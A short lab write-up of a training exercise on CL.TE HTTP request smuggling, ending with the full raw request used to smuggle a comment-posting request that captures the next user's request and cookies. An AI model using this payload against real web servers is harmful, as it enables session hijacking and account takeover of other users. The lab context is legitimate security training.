# Practitioner Lab 133: Exploiting HTTP request smuggling to capture other users' requests

---

This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.

![Untitled](Practitioner%20Lab%20133%20Exploiting%20HTTP%20request%20smugg%2009ab040770df49e8b2806ea0ff2db500/Untitled.png)

This is a CLTE

![Untitled](Practitioner%20Lab%20133%20Exploiting%20HTTP%20request%20smugg%2009ab040770df49e8b2806ea0ff2db500/Untitled%201.png)

I tested this to see how it would work if I changed the order of the parameters. 

![Untitled](Practitioner%20Lab%20133%20Exploiting%20HTTP%20request%20smugg%2009ab040770df49e8b2806ea0ff2db500/Untitled%202.png)

This was a test to see if my email would post correctly, Now I can find to see if I can get the victim to post. 

![Untitled](Practitioner%20Lab%20133%20Exploiting%20HTTP%20request%20smugg%2009ab040770df49e8b2806ea0ff2db500/Untitled%203.png)

![Untitled](Practitioner%20Lab%20133%20Exploiting%20HTTP%20request%20smugg%2009ab040770df49e8b2806ea0ff2db500/Untitled%204.png)

```
POST / HTTP/1.1
Host: 0a970092033166d98173575f00b700c7.web-security-academy.net
Cookie: session=ETbxO1thi5mRAtGeZhBt2N7ghaSmpEke
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a970092033166d98173575f00b700c7.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 339
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: 0a970092033166d98173575f00b700c7.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=ETbxO1thi5mRAtGeZhBt2N7ghaSmpEke
Content-Length: 950

csrf=6HJWPRoqxI41dE10AVNVdSTPCvoYyboJ&postId=6&name=XVICTIM%40new&email=VICTIM%40me&website=https://eyes.com&comment=X
```

Using a payload like this it worked out.